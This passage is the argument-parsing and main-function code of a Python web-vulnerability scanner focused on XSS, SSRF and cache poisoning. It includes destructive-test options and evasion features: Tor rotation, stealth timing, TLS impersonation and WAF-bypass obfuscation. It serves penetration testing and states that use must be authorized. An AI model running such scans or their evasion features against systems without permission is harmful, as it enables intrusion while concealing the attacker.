                        help="v10.15: ENABLE SSRF (Server-Side Request "
                             "Forgery) scan. Default: OFF. Active vector — "
                             "forces the target server to make requests to "
                             "cloud metadata (169.254.169.254), internal "
                             "services (redis/SSH/etc), IP-encoding bypass. "
                             "May trigger IDS/cloud alerts. Only use on "
                             "AUTHORIZED targets with explicit permission. "
                             "CWE-918.")
    parser.add_argument("--destructive", action="store_true",
                        help="⚠ v10.14: ENABLE DESTRUCTIVE TESTS — "
                             "Cache Poisoning, Host Header password "
                             "reset, Stored XSS via headers. THESE "
                             "TESTS LEAVE PERSISTENT STATE ON THE "
                             "SERVER. Only use on AUTHORIZED targets "
                             "with explicit permission. NO LIABILITY "
                             "for damages. Default: OFF.")
    parser.add_argument("--destructive-test-email", type=str, default=None,
                        help="Email address for Host Header password "
                             "reset test (must be under pentester "
                             "control — a real email WILL be sent). "
                             "Required for Host Header destructive test.")
    parser.add_argument("--evidence-store", type=str, default=None, metavar="FILE",
                        help="v10.23: Persist EVERY finding (info→critical) "
                             "with full raw evidence to a JSONL file for "
                             "ML / drift / triage. Captures all phases. "
                             "Default off.")
    parser.add_argument("--evidence-origin", type=str, default="public",
                        choices=["public", "consented", "client"],
                        help="Data-governance origin tag for evidence records "
                             "(default: public). Use 'client' only with "
                             "explicit authorization.")
    parser.add_argument("--evidence-retention-days", type=int, default=None,
                        help="Retention window (days) stamped on evidence "
                             "records; sets expires_at. Default: indefinite.")
    parser.add_argument("--triage-stats", type=str, default=None, metavar="STORE",
                        help="v10.28: Print labeling progress for an evidence "
                             "store (how many findings labeled / trainable) "
                             "and exit.")
    parser.add_argument("--triage-label", type=str, default=None, nargs=3,
                        metavar=("STORE", "FINGERPRINT", "GROUND_TRUTH"),
                        help="v10.28: Record a triage decision into an evidence "
                             "store. GROUND_TRUTH ∈ confirmed|dismissed|"
                             "duplicate|exploited|unsure. Appends a label event "
                             "(builds the ground-truth dataset for ML) and exits.")
    parser.add_argument("--scan-intensity", type=str, default=None,
                        choices=["stealth", "normal", "fast"],
                        help="Behavioral request timing (#7). 'stealth' = log-normal "
                             "delays with an occasional 'think pause' (low & slow scan). "
                             "'normal' = peak ~0.5s. 'fast' = peak ~0.1s. "
                             "Default = no timing (just --sleep).")
    parser.add_argument("--proxy", type=str, default=None,
                        help="HTTP/HTTPS/SOCKS5 proxy (e.g. http://127.0.0.1:8080 or "
                             "socks5h://127.0.0.1:9050). For Tor use --tor instead of a proxy.")
    # Tor integrace
    parser.add_argument("--tor", action="store_true",
                        help="Route all traffic through Tor SOCKS5 (127.0.0.1:9050) + "
                             "automatically rotate the circuit. Requires a running Tor daemon.")
    parser.add_argument("--tor-control-port", type=int, default=9051,
                        help="Tor ControlPort (default 9051)")
    parser.add_argument("--tor-socks-port", type=int, default=9050,
                        help="Tor SOCKS5 port (default 9050)")
    parser.add_argument("--tor-password", type=str, default=None,
                        help="Password for the Tor ControlPort (if HashedControlPassword "
                             "is set in torrc)")
    parser.add_argument("--tor-rotate-every", type=int, default=50,
                        help="Rotate the Tor circuit every N requests (default 50). "
                             "Note: Tor has a MIN_ROTATE_INTERVAL of 10s, faster "
                             "rotation is ignored.")
    parser.add_argument("--tor-isolate-workers", action="store_true",
                        help="Each worker gets its own Tor circuit (via SOCKS5 "
                             "username isolation). Requires IsolateSOCKSAuth in torrc.")
    # NOTE: --max-retries / --backoff were removed in v10.58 — they were dead
    # flags: parsed into args but NEVER read (the retry/backoff logic uses the
    # DEFAULT_RETRIES / DEFAULT_BACKOFF constants directly). Setting them had no
    # effect, so exposing them was misleading. The constants themselves stay.
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--download", action="store_true")
    parser.add_argument("--yes", action="store_true")
    parser.add_argument("--post", action="store_true")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--headers", action="store_true")
    parser.add_argument("--path-scan", action="store_true",
                        help="v10.16: ENABLE path-segment XSS scan — injects "
                             "payloads into the last URL path segment "
                             "(/path/<payload>). Catches reflections in 404 / "
                             "breadcrumb pages that query-param scans miss. "
                             "Passive GET. Default OFF.")
    parser.add_argument("--cookie-scan", action="store_true",
                        help="v10.16: ENABLE cookie-reflected XSS scan — sends "
                             "payloads in common cookie values (theme/lang/...) "
                             "and looks for unescaped reflection. Passive GET. "
                             "Default OFF.")
    parser.add_argument("--dom", action="store_true")
    parser.add_argument("--checkpoint", type=str, default=None, metavar="FILE",
                        help="v10.16: Enable resume/checkpoint. Periodically "
                             "saves scan state (crawl results, confirmed "
                             "findings) to FILE so a crashed/interrupted scan "
                             "can resume with --resume instead of starting "
                             "over. Atomic writes; safe for long scans.")
    parser.add_argument("--resume", action="store_true",
                        help="v10.16: Resume from the --checkpoint FILE if it "
                             "matches this scan (same target + scan config). "
                             "Completed phases (crawl, seed) are skipped and "
                             "their results restored. No-op if no compatible "
                             "checkpoint exists.")
    parser.add_argument("--html-report", type=str, default=None, metavar="FILE",
                        help="v10.16: Write a client-ready, self-contained "
                             "HTML report (severity summary, findings with "
                             "remediation, CVE table) to FILE. Payloads are "
                             "HTML-escaped; opens safely in any browser.")
    parser.add_argument("--sarif", type=str, default=None, metavar="FILE",
                        help="v10.17: Write findings in SARIF 2.1.0 format to "
                             "FILE — the standard consumed by GitHub Code "
                             "Scanning, GitLab, and Azure DevOps. Enables "
                             "CI/CD security-pipeline integration.")
    parser.add_argument("--poc", type=str, default=None, metavar="FILE",
                        help="v10.58: Write a self-contained, bug-bounty-ready "
                             "PoC bundle (.html) to FILE — one proof-of-concept "
                             "per confirmed finding (Launch link / auto-submit "
                             "form + curl repro + Markdown writeup). Inert until "
                             "you click Launch; browser-confirmed findings are "
                             "flagged.")
    parser.add_argument("--fail-on-findings", action="store_true",
                        help="v10.17: Exit with code 1 if any XSS finding is "
                             "reported (for CI gating — fail the build when a "
                             "vulnerability is found). Without it, exit is 0 "
                             "on a clean run regardless of findings.")
    parser.add_argument("--jsonp-scan", action="store_true",
                        help="v10.16: Probe endpoints for JSONP callback "
                             "injection — a ?callback= value reflected as a "
                             "function call in a JS content-type response is "
                             "direct XSS via <script src>. High-value, opt-in.")
    parser.add_argument("--dangling-scan", action="store_true",
                        help="v10.16: Dangling-markup injection scan — injects "
                             "an unclosed tag/attribute and checks if it "
                             "reflects raw, swallowing following HTML (CSRF "
                             "tokens etc.). Scriptless exfil that works even "
                             "when XSS is blocked by CSP. High-value, opt-in.")
    parser.add_argument("--svg-scan", action="store_true",
                        help="v10.16: SVG/XML reflection scan — checks if a "
                             "parameter reflects into an image/svg+xml or "
                             "application/xml response, where <script> executes "
                             "on direct URL access. Often missed. Opt-in.")
    parser.add_argument("--graphql-scan", action="store_true",
                        help="v10.51: GraphQL reflected-XSS scan — discovers "
                             "GraphQL endpoints (/graphql, /api/graphql, …) and "
                             "probes error-message and String-variable "
                             "reflection. The single-endpoint API surface that "
                             "crawl/query-string phases miss. Read-only (queries "
                             "only, never mutations). High-value, opt-in.")
    parser.add_argument("--markdown-scan", action="store_true",
                        help="v10.59: Markdown / rich-text injection scan — for "
                             "apps that render user Markdown (comments, wikis, "
                             "issue trackers). Confirms the endpoint renders "
                             "Markdown, then tests javascript: links, raw-HTML "
                             "passthrough and title breakout. Opt-in.")
    parser.add_argument("--css-scan", action="store_true",
                        help="v10.59: CSS injection / scriptless-exfil scan — "
                             "reflection into <style> / style=\"…\" that lets an "
                             "attacker inject CSS (attribute-selector + "
                             "background:url / @import data exfiltration). Works "
                             "even under a strict CSP. Opt-in.")
    parser.add_argument("--htmx-alpine-scan", action="store_true",
                        help="v10.69: htmx / Alpine.js attribute-injection scan — "
                             "on pages that load Alpine or htmx, reflection into an "
                             "HTML attribute context lets an attacker inject "
                             "x-init / hx-on::load which the framework runs with NO "
                             "<script> tag (bypasses inline-script CSP). "
                             "Framework-gated to keep FPs low. Opt-in.")
    parser.add_argument("--dompurify-config-scan", action="store_true",
                        help="v10.70: config-aware DOMPurify audit — statically "
                             "flags an app WEAKENING its own DOMPurify config "
                             "(ADD_TAGS / ADD_ATTR on*= / ALLOW_UNKNOWN_PROTOCOLS / "
                             "ADD_URI_SAFE_ATTR / USE_PROFILES). Bypasses the "
                             "sanitizer on ANY version, no CVE. Page-level, uses "
                             "the crawl cache (no extra requests). Opt-in.")
    parser.add_argument("--cache-poisoning-scan", action="store_true",
                        help="v10.71: web cache poisoning → stored XSS — sends "
                             "unkeyed headers (X-Forwarded-Host, …), confirms the "
                             "reflection is CACHEABLE and PERSISTS to a clean "
                             "request (real poisoning, not just header reflection). "
                             "Safe: unique cache-buster isolates each probe to a "
                             "throwaway entry. Active, opt-in.")
    parser.add_argument("--sourcemap", action="store_true",
                        help="v10.51: Source-map de-minification — when a JS "
                             "bundle ships a .map with sourcesContent, recover "
                             "the ORIGINAL source and run taint analysis on it "
                             "(minification hides the source→sink structure). "
                             "Augments --static-js (requires it); findings appear "
                             "in the static-JS section with origin=sourcemap.")
    parser.add_argument("--dom-budget-secs", type=int, default=45)
    parser.add_argument("--dom-wait", type=float, default=2.0)
    parser.add_argument("--crawl-depth", type=int, default=0)
    parser.add_argument("--crawl-delay", type=float, default=0.1,
                        help="Prodleva mezi jednotlivými požadavky crawleru (s). "
                             "Škáluje se počtem workerů, takže výsledná "
                             "frekvence je ~1 request za crawl-delay sekund.")
    parser.add_argument("--crawl-max-pages", type=int, default=200)
    parser.add_argument("--fuzz", action="store_true")
    parser.add_argument("--fuzz-iters", type=int, default=200)
    parser.add_argument("--fuzz-budget-secs", type=int, default=60)
    parser.add_argument("--fuzz-batch", type=int, default=16)
    parser.add_argument("--fuzz-topn", type=int, default=3)
    parser.add_argument("--fuzz-ctx-probe", action="store_true")
    # Context-aware scan (default ON — targeted payloads by context)
    parser.add_argument("--no-context-scan", action="store_true",
                        help="Disables the context-aware scan (context-specific payloads)")
    # Stored XSS
    parser.add_argument("--stored", action="store_true",
                        help="Enables the stored XSS scan (POST with a marker + verification)")
    parser.add_argument("--stored-verify-url", action="append", default=[],
                        help="URL for stored XSS verification (repeatable). Default: all crawled pages.")
    parser.add_argument("--stored-wait", type=float, default=1.0,
                        help="Wait before verification (DB commit / async processing). Default 1.0s.")
    # Blind XSS
    parser.add_argument("--blind", action="store_true",
                        help="Enables the Blind XSS scan (Out-of-Band callback)")
    parser.add_argument("--blind-oob-url", type=str, default=None,
                        help="Callback URL for Blind XSS (e.g. https://xss.hunter/api, "
                             "a Burp Collaborator URL, or your own server). "
                             "Payloads load JS from this URL — markers go in the JSON report.")
    parser.add_argument("--blind-map-path", type=str, default=None,
                        help="Write the blind-XSS token→injection-point map to this "
                             "file, so a later OOB callback can be correlated back to "
                             "the exact URL/param/vector that fired (JSON).")
    parser.add_argument("--blind-poll-secs", type=float, default=0.0,
                        help="After spraying blind payloads, poll <blind-oob-url>/results "
                             "for this many seconds to correlate fired tokens in-scan "
                             "(0 = don't poll; check the collector manually).")
    # postMessage XSS
    parser.add_argument("--postmessage", action="store_true",
                        help="Enables the postMessage XSS scan (static + dynamic with Playwright)")
    # WebSocket XSS
    parser.add_argument("--websocket", action="store_true",
                        help="Enables the WebSocket XSS scan (static + dynamic with Playwright)")
    # Headless DOM verifier (v5)
    parser.add_argument("--headless-verify", action="store_true",
                        help="After the scan, opens high-confidence findings in Chromium "
                             "and definitively verifies whether they actually execute JS "
                             "(captures the dialog/console with a canary token). "
                             "Requires playwright. Cost: ~600ms/finding.")
    # DOM v6 — taint-aware DOM XSS detection
    parser.add_argument("--dom-v6", action="store_true",
                        help="Activates DOM v6 taint-aware analysis: for each crawled "
                             "page it injects a unique canary into EVERY query parameter "
                             "+ fragment, opens it in Chromium and tracks SOURCE->SINK chains "
                             "(location.*, document.*, URLSearchParams, postMessage). "
                             "Finds XSS that a pure HTTP scanner misses (sudo level19, "
                             "Twitter-style #! XSS). Requires playwright. Cost: ~1-2s/page.")
    # Static JS analyzer — AST taint flow without runtime exec
    parser.add_argument("--static-js", action="store_true",
                        help="Activates static JS analysis: parses inline <script> blocks "
                             "and external .js files, tracks tainted variables through the AST, "
                             "finds source->sink chains WITHOUT runtime execution. Very fast "
                             "(~ms/file). Requires esprima (pip install esprima).")
    # Trusted Types analyzer (v8 — 2026 modern XSS defense)
    parser.add_argument("--trusted-types", action="store_true",
                        help="Audits the CSP Trusted Types config (require-trusted-types-for, "
                             "trusted-types directive) + AST audit of createPolicy() definitions in JS. "
                             "Detects silent backdoors: pass-through default policy, wildcard "
                             "trusted-types, weak regex sanitization. Firefox 148 (2026) enabled "
                             "the Sanitizer API by default, Google/Stripe run TT in production. "
                             "Cost: ~ms/page (HTTP header + AST).")
    # Stored XSS round-trip (v9 — multi-canary persistence detection)
    parser.add_argument("--stored-roundtrip", action="store_true",
                        help="Multi-canary stored XSS hunt: every POST/PUT request gets "
                             "a unique canary token, after the scan it re-crawls all pages + "
                             "common admin paths (/admin, /dashboard, /wp-admin) and looks for "
                             "canaries as stored XSS reflections. Severity boost to CRITICAL "
                             "if a canary ends up in an admin context. Finds the classic stored "
                             "XSS pattern (comment in DB -> admin panel displays it -> exec). "
                             "Requires --stored. Cost: 1 GET/page after the main scan.")
    # Prototype pollution -> XSS chain (v10 — CVE-2026-41238 DOMPurify bypass)
    parser.add_argument("--proto-pollution", action="store_true",
                        help="Detects prototype pollution -> XSS chains. AST audit: pollution "
                             "sources (lodash.merge / $.extend(true) / deepmerge / unsafe "
                             "for-in), pollution gadgets (innerHTML/tagNameCheck/transport_url), "
                             "vulnerable DOMPurify versions (3.0.1-3.3.3 = CVE-2026-41238). "
                             "Source+gadget or source+vuln-DOMPurify within the same page "
                             "= CONFIRMED chain (CRITICAL). Plus a URL-based probe via the DOM v6 "
                             "phase if enabled. Cost: ~ms/page (pure offline AST).")
    # DOM Clobbering -> XSS chain (v10.4 — Intigriti March 2026 CTF threat)
    parser.add_argument("--dom-clobbering", action="store_true",
                        help="Detects DOM Clobbering -> XSS chains. AST audit: "
                             "(A) DOMPurify.sanitize() calls without FORBID_ATTR "
                             "for name/id/for, (B) property reads on unowned "
                             "globals (window.X.dataset/.href, etc.), (C) "
                             "dangerous sinks reading from unowned identifiers "
                             "(script.src = X.Y, eval(X.Y)). A sanitizer issue + "
                             "a clobberable sink on the same page = HIGH chain. "
                             "A 2026 mainstream attack (Intigriti March 2026 CTF). "
                             "Cost: ~ms/page (pure offline AST).")
    # SSR Hydration XSS (v10.5 — CVE-2026-27902 Svelte 5 + general SSR)
    parser.add_argument("--ssr-hydration", action="store_true",
                        help="Detects SSR Hydration XSS — server-side rendering "
                             "frameworks (Svelte/SvelteKit/Next.js/Nuxt/Remix/Astro) "
                             "embed JSON state and an error boundary into the initial HTML. "
                             "Serialization bugs -> JSON breaks out of an HTML comment / "
                             "<script type=\"application/json\"> context -> XSS exec "
                             "BEFORE client JS loads (bypasses CSP-via-meta, Trusted "
                             "Types not active). 4 detection layers: framework "
                             "fingerprinting + version classification (CVE-2026-27902 "
                             "Svelte 5.53.0-5.53.4, CVE-2026-27125, CVE-2024-45047), "
                             "comment-break detection, script-tag breakout, reflected "
                             "canary in hydration JSON. Cost: ~ms/page (regex+text scan).")
    # CSP Bypass Detection Layer (v10.6 — 2026 BIGGEST GAP)
    parser.add_argument("--csp-bypass", action="store_true",
                        help="Detects CSP bypass-vulnerable configuration. Tranco 50k "
                             "research: 94.72%% of deployed CSP policies have a bypass. "
                             "6 detection layers: (A) whitelist entries with known "
                             "JSONP bypasses (*.googleapis.com, *.cloudflare.com, "
                             "cdnjs, etc.), (B) unsafe-inline/unsafe-eval without a nonce, "
                             "missing base-uri / object-src, (C) nonce reuse detection "
                             "(2 fetches of the same URL, compare nonces), (D) meta-tag CSP "
                             "vs HTTP header (meta is leakable via CSS), (E) wildcard "
                             "host risk (*.com / *.io / etc.), (F) CSS injection sinks "
                             "(CVE-2026-2441 — template vars in <style>). "
                             "Cost: ~ms/page (regex/string scan, 1 extra fetch for "
                             "the nonce reuse check).")
    # WAF Adaptive Obfuscation Pipeline (v10.7)
    parser.add_argument("--adaptive-waf", action="store_true",
                        help="WAF-aware adaptive obfuscation. When a WAF is detected "
                             "(Cloudflare/Akamai/AWS WAF/Imperva/F5), it prefers "
                             "WAF-specific bypass templates from 2024-2026 bug bounty "
                             "research. Without WAF detection it uses 12 generic "
                             "high-success templates (regex source split, tagged "
                             "templates, HTML entity polyglots, mixed-case event "
                             "handlers, math/svg namespace abuse, Unicode escape "
                             "in property access, etc.). Plus encoding mutations on "
                             "the original payload (Unicode escape of keywords, "
                             "hex entities, mixed case). No extra HTTP requests — "
                             "pure mutation, zero learning state. Complementary "
                             "with the existing context-aware fuzzer.")
    # Open Redirect -> XSS (v10.11)
    parser.add_argument("--open-redirect", action="store_true",
                        help="Open Redirect -> XSS chain detection. Scans URL parameters "
                             "matching ~40 redirect-related names (?url=, ?redirect=, "
                             "?next=, ?dest=, ?return=, OAuth ?redirect_uri=, etc.). "
                             "For each candidate it tries a javascript:alert(1) payload and "
                             "checks: (a) HTTP 30x with a Location: javascript: header = "
                             "CRITICAL (server reflects); (b) HTML <meta refresh> or "
                             "<a href> with javascript: = HIGH; (c) JS code location = "
                             "\"javascript:\" = HIGH. Also non-XSS open redirects "
                             "(medium severity). Second strategy: static AST analysis "
                             "of JS bundles for sinks (location.href = X, location.replace, "
                             "history.pushState) where X traces to user input. 2-step "
                             "variable tracking (params.get -> next -> location.href). "
                             "Cost: ~30 HTTP requests + AST analysis of existing bundles.")
    # Authenticated scanning (v10.15)
    parser.add_argument("--cookies", type=str, default="",
                        help="Cookie string for authenticated scanning. Paste "
                             "from browser DevTools (Application → Cookies → "
                             "copy as header). Format: 'PHPSESSID=abc; "
                             "remember=xyz; theme=dark'. Cookies are scoped to "
                             "the target host. Unlocks ~80%% of XSS bugs that "
                             "hide behind authentication (admin panels, profile "
                             "pages, settings, dashboards). The scanner probes "
                             "the target URL and warns if the session looks "
                             "expired (redirect to /login, login form detected).")
    parser.add_argument("--auth-config", type=str, default="",
                        help="Path to a YAML/JSON file with auth credentials. "
                             "Avoids leaking secrets into shell history. "
                             "Schema: { 'cookies': 'name1=val1; name2=val2' } "
                             "or { 'cookies': { 'name1': 'val1', 'name2': 'val2' } }. "
                             "When both --cookies and --auth-config are set, "
                             "--cookies wins (CLI overrides file).")

    args = parser.parse_args()

    # v10.28: Triage store-management příkazy — zpracuj a skonči (nejsou to skeny).
    if args.triage_stats:
        try:
            from _finding_store import labeling_stats as _lstats
            st = _lstats(args.triage_stats)
            print(f"[TRIAGE] store: {args.triage_stats}")
            print(f"  unique findings:     {st['unique_findings']}")
            print(f"  labeled:             {st['labeled']}")
            print(f"  trainable examples:  {st['trainable_examples']}")
            print(f"  by ground_truth:     {st['by_ground_truth']}")
        except Exception as _e:
            print(f"[TRIAGE] error: {_e}")
        sys.exit(0)
    if args.triage_label:
        store_p, fp, gt = args.triage_label
        try:
            from _finding_store import record_label as _rlabel
            _rlabel(store_p, fp, gt, labeled_by="cli")
            print(f"[TRIAGE] labeled {fp[:12]}… as '{gt}' in {store_p}")
        except Exception as _e:
            print(f"[TRIAGE] error: {_e}")
            sys.exit(1)
        sys.exit(0)

    # --target je povinný pro skenování (triage příkazy výše ho nepotřebují)
    if not args.target:
        parser.error("the following arguments are required: --target/-t "
                     "(not needed only for --triage-stats / --triage-label)")

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if not args.yes:
        logging.warning("Use only with written authorization and within a defined test scope.")

    verify  = not args.no_verify

    # ── Tor inicializace (pokud --tor) ────────────────────────────────
    proxies = None
    if args.tor:
        logging.info("Inicializuji Tor controller...")
        tor = init_tor_controller(
            control_port=args.tor_control_port,
            socks_port=args.tor_socks_port,
            password=args.tor_password,
        )
        if tor is None:
            logging.error(
                "[ERR] Tor initialization failed. Possible causes:\n"
                "   1. Tor is not running → sudo systemctl start tor\n"
                "   2. ControlPort is not running → check /etc/tor/torrc (ControlPort 9051)\n"
                "   3. Auth problem → try --tor-password <password> or CookieAuthFile\n"
                "   4. Missing 'stem' → pip install stem"
            )
            sys.exit(1)

        # Nastav proxy na Tor SOCKS5 (overwrite args.proxy pokud byl zadán)
        if args.proxy:
            logging.warning(
                f"[!]️  --tor takes over --proxy {args.proxy} — using Tor SOCKS5"
            )
        proxies = tor.requests_proxies()

        # Ověř, že traffic opravdu jde přes Tor
        logging.info("Verifying exit IP via check.torproject.org...")
        ip = tor.verify_exit_ip()
        if ip:
            logging.info(f"[OK] Tor active — exit IP: {ip}")
        else:
            logging.error(
                "[ERR] check.torproject.org nepotvrdil Tor routing. "
                "Your traffic may not be anonymized — aborting."
            )
            sys.exit(1)

        # Pokud nejsi na Windows, doporuč DNS check
        logging.info(
            f"DNS resolution goes through Tor (socks5h://). "
            f"Circuit rotation every {args.tor_rotate_every} requests."
        )
    elif args.proxy:
        # Klasická proxy (ne Tor)
        proxies = {"http": args.proxy, "https": args.proxy}
        # Auto-detect SOCKS — uživatel musí mít PySocks nainstalovaný
        if args.proxy.startswith("socks"):
            try:
                import socks  # noqa: F401
            except ImportError:
                logging.error(
                    "[ERR] SOCKS proxy requires PySocks. Install: "
                    "pip install 'requests[socks]'"
                )
                sys.exit(1)

    # ── UA rotator inicializace (s 9 features) ────────────────────────
    if args.rotate_ua or args.tor:
        # Reset (mohl by být cached z předchozího běhu)
        reset_ua_rotator()

        # Custom UA pool má prioritu
        if args.ua_file:
            rot = get_ua_rotator(
                ua_file=args.ua_file,
                rotate_every=args.ua_rotate_every,
                target_country=args.target_country,
            )
            logging.info(
                f"UA rotation active: pool from {args.ua_file} "
                f"({len(rot._agents)} UA), rotation every {args.ua_rotate_every} req"
            )
        else:
            # Fresh fetch (default), nebo offline mode pokud --no-ua-fresh
            fresh = not args.no_ua_fresh
            rot = get_ua_rotator(
                user_agents=None if fresh else DEFAULT_USER_AGENTS,
                rotate_every=args.ua_rotate_every,
                fresh=fresh,
                target_country=args.target_country,
            )
            mode = "live fresh" if fresh else "offline (DEFAULT_USER_AGENTS)"
            logging.info(
                f"UA rotation active: pool {len(rot._agents)} UA ({mode}), "
                f"rotation every {args.ua_rotate_every} req"
            )

        if args.target_country:
            logging.info(
                f"Target country: {args.target_country} → boosting lang weights in Accept-Language"
            )

    # ── curl_cffi check ───────────────────────────────────────────────
    if args.cffi_impersonate:
        if not is_curl_cffi_available():
            logging.error(
                "[ERR] --cffi-impersonate set, but curl_cffi is not installed. "
                "Nainstaluj: pip install curl_cffi"
            )
            sys.exit(1)
        logging.info(
            f"curl_cffi active: impersonate={args.cffi_impersonate} "
            f"(Chrome JA3/JA4 + HTTP/2 SETTINGS frame)"
        )

    # ── Behavioral timing ────────────────────────────────────────────
    if args.scan_intensity:
        logging.info(
            f"⏱️  Scan intensity: {args.scan_intensity} → log-normal request delays"
        )

    payload_path = Path(args.payloads)
    if args.download or not payload_path.exists():
        logging.info("Stahuji payloady z RAW_URL...")
        try:
            download_payloads(raw_url=RAW_URL, out_file=PAYLOAD_FILE)
        except Exception as e:
            logging.error(f"Error downloading payloads: {e}")

    payloads = load_payloads(payload_path)

    # ── Auth resolution (v10.15) ──
    # Precedence: --cookies overrides --auth-config (CLI > file).
    # Both → only the CLI value is used (logged so the user notices).
    _resolved_cookies = ""
    if args.cookies:
        _resolved_cookies = args.cookies.strip()
        if args.auth_config:
            logging.warning(
                "[!] Both --cookies and --auth-config given; using --cookies "
                "(CLI overrides file)")
    elif args.auth_config:
        try:
            from _auth import load_auth_config as _load_auth, cookies_to_header
            _cfg_cookies = _load_auth(args.auth_config)
            if _cfg_cookies:
                _resolved_cookies = cookies_to_header(_cfg_cookies)
                logging.info(
                    f"[OK] Loaded {len(_cfg_cookies)} cookies from "
                    f"{args.auth_config}")
            else:
                logging.warning(
                    f"[!] {args.auth_config}: no 'cookies:' field found "
                    f"(running anonymously)")
        except FileNotFoundError:
            logging.error(
                f"[ERR] --auth-config: {args.auth_config} not found")
            sys.exit(2)
        except Exception as _ace:
            logging.error(
                f"[ERR] --auth-config: failed to load {args.auth_config}: "
                f"{_ace}")
            sys.exit(2)

    # CLI používá výchozí handlery (print + logging)
    found = run_scan(
        target             = args.target,
        payloads           = payloads,
        workers            = max(1, min(args.thread, 500)),
        timeout            = args.timeout,
        sleep_between      = args.sleep,
        verify_ssl         = verify,
        limit_urls         = args.limit_urls,
        limit_payloads     = args.limit_payloads,
        early_exit         = args.early_exit,
        canary             = args.canary,
        marker_enabled     = args.marker,
        marker_param       = args.marker_param,
        verbose            = args.verbose,
        report_path        = Path(args.report),
        json_report        = Path(args.json_report),
        rotate_ua          = args.rotate_ua,
        user_agents        = DEFAULT_USER_AGENTS,
        proxies            = proxies,
        follow_redirects   = args.follow_redirects,
        crawl_depth        = args.crawl_depth,
        crawl_delay        = args.crawl_delay,
        crawl_max_pages    = args.crawl_max_pages,
        enable_fuzz        = args.fuzz,
        fuzz_iters         = args.fuzz_iters,
        fuzz_budget_secs   = args.fuzz_budget_secs,
        fuzz_batch         = args.fuzz_batch,
        fuzz_topn          = args.fuzz_topn,
        fuzz_ctx_probe     = args.fuzz_ctx_probe,
        dom_dynamic        = args.dom,
        dom_budget_secs    = args.dom_budget_secs,
        dom_wait           = args.dom_wait,
        enable_post_scan   = args.post,
        enable_json_scan   = args.json,
        enable_header_scan = args.headers,
        enable_path_scan = args.path_scan,
        checkpoint_path = args.checkpoint,
        resume = args.resume,
        html_report = args.html_report,
        sarif_report = args.sarif,
        poc_report = args.poc,
        enable_jsonp_scan = args.jsonp_scan,
        enable_dangling_scan = args.dangling_scan,
        enable_svg_scan = args.svg_scan,
        enable_graphql_scan = args.graphql_scan,
        enable_markdown_scan = args.markdown_scan,
        enable_css_scan = args.css_scan,
        enable_htmx_alpine_scan = args.htmx_alpine_scan,
        enable_dompurify_config_scan = args.dompurify_config_scan,
        enable_cache_poisoning_scan = args.cache_poisoning_scan,
        enable_sourcemap = args.sourcemap,
        enable_cookie_scan = args.cookie_scan,
        enable_context_scan = not args.no_context_scan,
        enable_stored_scan = args.stored,
        stored_verify_urls = args.stored_verify_url or None,
        stored_wait_secs   = args.stored_wait,
        enable_blind_xss   = args.blind,
        blind_oob_url      = args.blind_oob_url,
        blind_map_path     = args.blind_map_path,
        blind_poll_secs    = args.blind_poll_secs,
        enable_postmessage_scan = args.postmessage,
        enable_websocket_scan   = args.websocket,
        headless_verify         = args.headless_verify,
        dom_v6_taint            = args.dom_v6,
        static_js               = args.static_js,
        trusted_types           = args.trusted_types,
        stored_roundtrip        = args.stored_roundtrip,
        proto_pollution         = args.proto_pollution,
        dom_clobbering          = args.dom_clobbering,
        ssr_hydration           = args.ssr_hydration,
        csp_bypass              = args.csp_bypass,
        adaptive_waf            = args.adaptive_waf,
        open_redirect           = args.open_redirect,
        auth_cookies            = _resolved_cookies,
        # Tor + UA rotace (hotnuto v main() přes init_tor_controller / get_ua_rotator)
        tor_rotate_every        = args.tor_rotate_every if args.tor else 0,
        tor_isolate_workers     = args.tor_isolate_workers,
        ua_rotate_every         = args.ua_rotate_every,
        cffi_impersonate        = args.cffi_impersonate,
        legacy_tls              = args.legacy_tls,
        scan_intensity          = args.scan_intensity,
        warmup_origin           = not args.no_warmup,
        cors_scan_enabled       = not args.no_cors_scan,
        crlf_scan_enabled       = not args.no_crlf_scan,
        xssi_scan_enabled       = not args.no_xssi_scan,
        ssrf_scan_enabled       = args.ssrf_scan,
        destructive_enabled     = args.destructive,
        destructive_test_email  = args.destructive_test_email,
        evidence_store_path     = args.evidence_store,
        evidence_origin         = args.evidence_origin,
        evidence_retention_days = args.evidence_retention_days,
        callbacks          = None,  # None = výchozí CLI handlery
    )

    print("\n=== Summary ===")
    if found:
        for url, param in found:
            print(f"[FOUND] {url} (param: {param})")
        print(f"\nTotal unique parameters found: {len(found)}")
    else:
        print("No payload reflection was found.")

    # ── A/B test report (#8) — pokud byl UA rotator aktivní ───────────
    rot = get_ua_rotator() if (args.rotate_ua or args.tor) else None
    if rot is not None and args.verbose:
        stats = rot.stats_report()
        if stats:
            print("\n=== UA A/B Stats (top 10) ===")
            print(f"{'UA':<65} {'sent':>6} {'succ':>6} {'block':>6} {'rate':>6}")
            print("-" * 92)
            for entry in stats[:10]:
                print(
                    f"{entry['ua']:<65} "
                    f"{entry['sent']:>6} "
                    f"{entry['success']:>6} "
                    f"{entry['blocked']:>6} "
                    f"{entry['success_rate']:>6.1%}"
                )

    # v10.17: CI gating — s --fail-on-findings vrať exit 1 když je nález,
    # aby pipeline mohl selhat build při objevené zranitelnosti. Bez flagu
    # zůstává exit 0 na čistém běhu bez ohledu na nálezy (zpětně kompatibilní).
    # NOTE: `found` is list(found_params) — only classic reflection populates it.
    # DOM-V6, headless, mXSS, static-JS, stored round-trip and proto-pollution
    # emit solely via _emit_hit/get_emitted_hits(), so gating on `found` alone
    # exits 0 despite confirmed criticals in the report (CI false negative — the
    # GUI banner at run_scan's 'done' phase was already fixed the same way).
    if getattr(args, "fail_on_findings", False):
        try:
            _ci_hits = len(get_emitted_hits())
        except Exception:
            _ci_hits = 0
        _ci_total = _ci_fail_count(_ci_hits, len(found))
        if _ci_total:
            print(f"\n[CI] --fail-on-findings: {_ci_total} finding(s) → exit code 1")
            sys.exit(1)


if __name__ == "__main__":
    main()
